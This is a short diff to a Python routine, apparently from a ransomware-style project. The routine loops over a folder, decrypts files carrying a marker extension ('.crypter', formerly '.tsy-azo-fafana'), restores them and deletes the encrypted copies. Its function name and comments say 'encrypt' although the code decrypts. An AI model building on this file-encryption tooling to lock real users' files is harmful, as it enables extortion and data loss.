@@ -17,13 +17,13 @@ def encrypt_disk(DriveLetter):
     while True:
         
         # Walk all Folder and Subfolder
-        for root, dirs, files in os.walk(f"{DriveLetter}:\\"):  
+        for root, dirs, files in os.walk(f"{DriveLetter}\\"):  
             # For each file
         	try :
 
 	        	for file in files:
 	        		# Check if the file is encrypted. 
-	        		if not file.endswith(f".tsy-azo-fafana"):
+	        		if not file.endswith(f".crypter"):
 	        			continue
 	        
 	        		# Open the file
@@ -38,7 +38,7 @@ def encrypt_disk(DriveLetter):
 	        		decrypted_data = cipher_suite.decrypt(data) 
 	        
 	        		# Write the file encrypted in other file
-	        		with open(file_path.replace(".tsy-azo-fafana", ""), "wb") as f:
+	        		with open(file_path.replace(".crypter", ""), "wb") as f:
 	        			f.write(decrypted_data)
 
 						# delete the encrypt file 
@@ -49,4 +49,4 @@ def encrypt_disk(DriveLetter):
         # wait 10s to continue process
         time.sleep(10)
 
-encrypt_disk("D")
+encrypt_disk("malware")
